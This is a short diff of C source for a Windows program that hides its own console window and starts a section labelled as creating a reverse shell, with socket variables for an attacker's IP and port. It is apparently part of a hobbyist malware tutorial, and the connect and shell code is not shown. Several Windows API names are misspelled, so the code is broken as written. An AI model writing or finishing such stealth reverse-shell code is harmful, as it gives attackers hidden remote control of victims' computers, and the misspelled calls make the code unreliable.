@@ -20,15 +20,20 @@
 
 int sock;
 
-int  APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdline, int nCmdshow) {
+int  APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdline, int nCmdshow) {  
 
     HWND stealth; // this will hide the console
-    AllocConsole(); // Allocates a new console for the calling process.
+    AllocConsole(); // Allocates a new console for the calling process.        
     stealth = FindWindowsA("ConsoleWindowsClass", NULL); // WINUSER.H
-
     ShowWindows(stealth, 0); //show windows or not
+   /*
+    hide our windows console making our programme invisivibe 
+    */ 
+    
+   
 
-    struct sockaddr_in ServAddr;
+// PART.2 (Creating our reverse shell)
+    struct sockaddr_in ServAddr; 
     unsigned short Servport;  //usinged short rage must be 0 to 65535 it's basically sutable for ports
     char *ServIP;
     WSADATA wsaData; //The WSADATA structure contains information about the Windows Sockets implementation "WINSOCK.H"
